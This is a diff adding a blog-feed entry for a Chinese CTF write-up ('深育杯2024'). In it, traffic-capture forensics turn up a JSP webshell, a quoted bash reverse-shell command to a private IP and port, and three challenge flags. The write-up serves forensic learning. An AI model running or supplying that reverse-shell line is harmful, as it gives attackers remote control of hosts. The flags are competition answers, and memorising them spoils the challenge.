@@ -7,6 +7,17 @@
     "home_page_url": "http://example.com",
     "items": [
         {
+            "id": "http://example.com/2024/11/23/%E7%BA%BF%E4%B8%8A%E8%B5%9B/%E6%B7%B1%E8%82%B2%E6%9D%AF2024/",
+            "url": "http://example.com/2024/11/23/%E7%BA%BF%E4%B8%8A%E8%B5%9B/%E6%B7%B1%E8%82%B2%E6%9D%AF2024/",
+            "title": "深育杯2024",
+            "date_published": "2024-11-22T16:00:00.000Z",
+            "content_html": "<h1 id=\"2024深育杯\"><a class=\"anchor\" href=\"#2024深育杯\">#</a> 2024 深育杯</h1>\n<blockquote>\n<p>本次比赛也是取证题做爽了，可惜就搞出来几题...<br />\n 搬运的群友和官方 WP (部分)</p>\n</blockquote>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<p>流量包 20662 发现一个 zip，解压出来一个 jsp 文件，是一个木马<br />\n<a href=\"https://postimg.cc/ftgsvr88\"><img loading=\"lazy\" data-src=\"https://i.postimg.cc/vTGmGRfw/QQ20241130-113720.png\" alt=\"QQ20241130-113720.png\" /></a><br />\n<a href=\"https://postimg.cc/WthT4s4C\"><img loading=\"lazy\" data-src=\"https://i.postimg.cc/VsF6D6Pf/QQ20241130-113802.png\" alt=\"QQ20241130-113802.png\" /></a><br />\n 得到：</p>\n<p><code>192.168.233.1+userLogin.jsp+2024-11-13 23:53</code></p>\n<p><code>PWN1：flag&#123;3018ec0e9ca0fb52d0a43836cc727b59&#125;</code></p>\n<p><a href=\"https://postimg.cc/JtBvg00r\"><img loading=\"lazy\" data-src=\"https://i.postimg.cc/RCPmWnzH/QQ20241130-114040.png\" alt=\"QQ20241130-114040.png\" /></a><br />\n<a href=\"https://postimg.cc/Zvk7ZPnT\"><img loading=\"lazy\" data-src=\"https://i.postimg.cc/j22GHZrJ/QQ20241130-114203.png\" alt=\"QQ20241130-114203.png\" /></a><br />\n 得到：</p>\n<p><code>bash -i &gt;&amp; /dev/tcp/192.168.233.133/8888 0&gt;&amp;1</code></p>\n<p><code>PWN2：flag&#123;7d5a0e505b4fd47553a29872cd140dc2&#125;</code></p>\n<p>这里注意别找错了：<br />\n<a href=\"https://postimg.cc/JshQfYxN\"><img loading=\"lazy\" data-src=\"https://i.postimg.cc/JzNdB9B2/QQ20241130-114345.png\" alt=\"QQ20241130-114345.png\" /></a><br />\n<a href=\"https://postimg.cc/Hcb0wqWg\"><img loading=\"lazy\" data-src=\"https://i.postimg.cc/63mHXKDy/QQ20241130-114447.png\" alt=\"QQ20241130-114447.png\" /></a><br />\n 官方 WP 说对流量包的返回结果挨个分析也可以找到：</p>\n<p><code>PWN3：flag&#123;sh3n7u3bei@2024welcome&#125;</code></p>\n",
+            "tags": [
+                "线上赛",
+                "线上赛"
+            ]
+        },
+        {
             "id": "http://example.com/2024/11/18/hgame%E6%AF%94%E8%B5%9B/hgame2024-week2/",
             "url": "http://example.com/2024/11/18/hgame%E6%AF%94%E8%B5%9B/hgame2024-week2/",
             "title": "hgame比赛-week2",
